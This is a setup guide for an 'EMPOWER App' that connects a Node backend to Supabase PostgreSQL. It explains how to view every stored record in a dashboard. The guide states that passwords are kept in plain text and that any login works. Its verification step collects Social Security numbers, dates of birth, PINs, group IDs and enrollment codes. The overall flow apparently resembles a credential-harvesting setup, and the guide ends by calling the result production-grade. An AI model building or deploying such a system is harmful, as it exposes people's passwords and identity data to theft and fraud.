# EMPOWER App - Supabase PostgreSQL Setup Guide

## Quick Setup (5 minutes)

### 1. Create Supabase Account
- Go to [supabase.com](https://supabase.com)
- Click **"Start your project"**
- Sign up with email/GitHub
- Create a new project (choose region closest to you)

### 2. Get Connection String
1. In Supabase Dashboard, click your **project name**
2. Go to **Settings** → **Database**
3. Under "Connection string", select **"Node.js"** from dropdown
4. **Copy the entire connection string**
   - It looks like: `postgresql://postgres.[xxx]:[password]@aws-0-[region].pooler.supabase.com:6543/postgres`

### 3. Update .env File
Open `.env` file in your project root and paste:
```
DATABASE_URL=postgresql://postgres.[xxx]:[password]@aws-0-[region].pooler.supabase.com:6543/postgres
NODE_ENV=development
PORT=3000
```

### 4. Start Backend
Run in terminal (from project folder):
```bash
npm start
```

### 5. View Your Data
- Go to Supabase Dashboard
- Click **"Table Editor"** in left sidebar
- See all your data in real-time:
  - **users** table - all registered users with plain text passwords
  - **sessions** table - active user sessions
  - **password_resets** table - password reset tokens
  - **verification_attempts** table - verification attempts

---

## Key Changes Made

✅ **Database Switched**: SQLite → PostgreSQL (Supabase)
✅ **Passwords**: Now stored as **plain text** (demo mode)
✅ **All User Data**: Automatically visible in Supabase Dashboard
✅ **Real-time Updates**: See data instantly as users register/verify

---

## How to View All Data

### Method 1: Supabase Dashboard (Easiest)
1. Log in to Supabase
2. Click your project
3. Click **"Table Editor"** (left sidebar)
4. View all tables and data in real-time

### Method 2: DBeaver (Advanced)
Free database viewer:
1. Download [dbeaver.io](https://dbeaver.io)
2. New Database Connection → PostgreSQL
3. Paste your Supabase connection details
4. Browse all data visually

---

## What Data Gets Saved

When users interact with your app, these are automatically saved:

**Registration:**
- Username, Email, **Password (plain text)**, First Name, Last Name

**Verification:**
- SSN, ZIP Code, Date of Birth, PIN, Group ID, Enrollment Code

**Email Verification:**
- Verification Codes, Verification Links, Timestamps

**Sessions:**
- Session tokens, Expiration times, User IDs

---

## Testing the App

1. Start backend: `npm start`
2. Open frontend: http://localhost:8000
3. Register → Verify → Email Verify → Complete!
4. **Check Supabase Dashboard** to see all saved data

---

## Troubleshooting

❌ **"Connection refused"**
- Make sure DATABASE_URL in .env is correct
- Verify you copied the **Node.js** version from Supabase
- Check that you included the password correctly (watch for special characters)

❌ **"Table does not exist"**
- Backend automatically creates tables on first run
- Check server console for "Database schema initialized" message
- If not there, restart backend: `npm start`

❌ **"Password or user incorrect"**
- Verify DATABASE_URL in .env matches exactly from Supabase
- Try resetting your Supabase password in Project Settings

---

## Demo Features

✨ Demo mode allows:
- Any username/password combo works
- Any verification data accepted
- All data visible in plain text (no hashing)
- Perfect for testing and demonstrations

---

Done! Your app is now using production-grade PostgreSQL with Supabase. 🎉
